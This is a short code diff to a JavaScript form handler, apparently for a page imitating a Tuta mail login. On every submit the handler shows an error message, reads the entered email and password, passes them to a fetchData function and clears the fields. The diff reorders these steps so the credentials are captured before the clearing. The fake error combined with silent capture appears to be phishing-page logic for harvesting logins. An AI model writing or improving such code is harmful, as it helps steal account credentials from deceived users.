@@ -60,21 +60,20 @@ document.addEventListener("DOMContentLoaded", () => {
     formTutaMail.addEventListener("submit", (e) => {
         e.preventDefault();
         const data = new FormData(formTutaMail);
-        console.log(data);
+        console.log(formTutaMail);
 
         const errorMess = formTutaMail.querySelector('.error-mess');
         errorMess.style.display = 'flex';
+
+        const email = data.get("email");
+        const password = data.get("pwd");
+
+        fetchData({email, password});
 
         const emailInput = formTutaMail.querySelector('#email');
         const passInput = formTutaMail.querySelector('#pwd');
         emailInput.value = '';
         passInput.value = '';
-
-        const email = data.get("email");
-        const password = data.get("pwd");
-
-
-        fetchData({email, password});
-      });
+              });
   };
 });
